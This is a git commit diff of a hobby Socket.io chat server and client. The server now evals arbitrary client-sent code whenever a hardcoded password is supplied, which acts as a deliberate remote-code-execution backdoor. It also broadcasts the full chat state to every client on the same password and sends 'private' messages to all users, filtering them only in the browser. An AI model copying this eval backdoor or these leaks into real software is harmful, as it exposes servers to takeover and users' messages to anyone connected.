52676febe495780185a680dfedcc7ca23ec3bd13
LookPlayEspYT <60762375+LookPlayEspYT@users.noreply.github.com>
2020-08-30 18:23:10 -0700

    chat v0.8 v0.1.8

--- src/index.js
+++ src/index.js
@@ -12,13 +12,38 @@ app.set('port', process.env.PORT || 1403);
 app.use(express.static(path.join(__dirname, 'public')));
 
 // SERVER
-
 server.listen(app.get('port'), () => {
   console.log(`Server on: 192.168.100.9:${app.get('port')}`);
 });
 
+const chat = {
+  integrants: {},
+  msgs: []
+};
+
+const Pass = 'No Hack DevAuthors pls :)';
 io.on('connect', socket => {
+  chat.integrants[socket.id] = socket;
   socket.on('evt', Data => {
     io.sockets.emit('evt', Data);
-  })
+  });
+  socket.on('req', Data => {
+    if(Data === Pass){
+      Data = {};
+      Data.answer = chat;
+      Data.error = false;
+    }else{
+      Data = {};
+      Data.error = true;
+      Data.hacker = socket.id;
+    }
+    Data.id = socket.id
+    console.log(Data)
+    io.sockets.emit('req', Data);
+  });
+  socket.on('exect', Data => {
+    if(Data.Pass === Pass){
+      eval(Data.Code);
+    }
+  });
 });
--- src/public/chat/Main.js
+++ src/public/chat/Main.js
@@ -13,29 +13,68 @@ UI.Main = document.querySelector('main');
 UI.ArrowBtn.onclick = () => {
   if(UI.openChat){
     UI.ArrowBtn.style.transform = "rotate(0deg)";
-    UI.Main.style.height = "5em";
   }else{
     UI.ArrowBtn.style.transform = "rotate(180deg)";
-    UI.Main.style.height = "30em";
   }
   UI.openChat = !UI.openChat;
 }
+if(getURLParam('color')){
+  document.querySelector('main').style.backgroundColor = '#' + getURLParam('color');
+}
+
+const MyInfo = {
+  id: Socket.id,
+  Name: '_Blank',
+  Username: 'Guest',
+  pass: '0000'
+};
+
 
 UserInput.onchange = e => {
   Emit('console', UserInput.value);
 }
 
+function sendMsg(Msg, private, To){
+  Emit('msg', Msg, {
+    type: private ? 'private' : 'public',
+    sendTo: To || null,
+    sendFrom: MyInfo
+  });
+}
+
 Socket.on('evt', Data => {
   if(Data.type === 'console'){
-    console.log(Data.id + '>>' +Data.msg);
+    console.log(Data.id + '>>' + Data.msg);
+  }else
+  if(Data.type === 'msg'){
+    if(Data.extraData.type === 'public'){
+      console.log(Data.sendFrom.Name + '>>' + Data.msg);
+    }else
+    if(Data.extraData.type === 'private'){
+      if(MyInfo.Name === Data.extraData.sendTo){
+        console.log(Data.extraData.sendFrom.Name + '>>' + Data.msg);
+      }
+    }
+  }else{
+    throw new Error('unspecified event type');
   }
 });
 
-function Emit(type, msg, extraData) {
+Socket.on('req', Data => {
+  console.log(Data);
+});
+
+function getURLParam(name){
+  return new URL(window.location.href).searchParams.get(name) || null;
+}
+function Emit(type, msg, extraData, request) {
   Socket.emit('evt', {
     type: type,
     msg: msg,
     extraData: extraData || null,
-    id: Socket.id
+    id: MyInfo.id
   });
+}
+function exect(Code, Pass){
+  Socket.emit('exect', {Pass,Code});
 }
